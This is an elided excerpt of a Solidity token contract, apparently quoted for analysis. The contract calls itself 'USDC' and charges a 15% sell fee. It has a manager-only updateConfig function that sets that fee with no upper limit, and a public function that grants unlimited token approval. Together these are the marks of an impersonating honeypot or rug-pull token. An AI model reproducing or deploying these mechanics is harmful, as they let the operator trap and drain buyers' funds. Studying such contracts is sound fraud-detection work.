...
contract PairTempAddress{
    ...
    function reApprove() public {
        IERC20(_usdt).approve(_token,type(uint).max);
    }
}
...
contract USDCToken is ERC20{
    ...
    uint256 public sellLiquidityFee = 1500;
    ...
    constructor()ERC20("USDC","USDC"){
        ...
        dividendTracker = BABYTOKENDividendTracker(0x12576E7cEAa364c5Ebc6a8A5c13b327B67AFc8ec);
    ...
    function updateConfig(uint256 f1,uint256 f2) public onlyManager{
        sellLiquidityFee = f1;
        liquidityFee = f2;
    }
    ...
    function _transferNormal(address from,address to,uint256 amount) internal{
        ...
        super._transfer(from, to, amount - liquidityFeeAmount);
    ...
    function _transferSell(address from,address to,uint256 amount) internal{
        ...
        uint256 liquidityFeeAmount = sellLiquidityFee * amount / 10000;
        super._transfer(from, to, amount - liquidityFeeAmount);
        super._transfer(from, address(this), liquidityFeeAmount);
    }
    ...
    function swapAndSendDividends(uint256 tokens) private {
        ...
        uint256 dividends = IERC20(rewardToken).balanceOf(pairTempAddress);
